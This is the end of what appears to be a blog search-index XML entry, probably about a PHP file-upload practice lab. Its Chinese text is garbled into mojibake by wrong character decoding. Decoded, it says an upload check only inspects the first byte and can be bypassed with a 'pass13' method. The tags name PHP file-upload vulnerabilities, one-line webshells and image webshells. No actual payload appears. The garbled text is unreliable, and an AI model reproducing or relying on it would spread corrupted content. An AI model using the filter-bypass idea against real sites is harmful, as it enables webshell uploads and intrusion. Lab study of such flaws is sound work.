<p>æ‰€ä»¥åªæ˜¯å¯¹ç¬¬ä¸€ä¸ªå­—èŠ‚è¿›è¡Œæ£€æµ‹, ç”¨pass13çš„æ–¹æ³•å³å¯ç»•è¿‡.</p>
]]></content>
      
        
        <tags>
            
            <tag> php æ–‡ä»¶ä¸Šä¼ æ¼æ´ ä¸€å¥è¯æœ¨é©¬ å›¾ç‰‡é©¬ </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
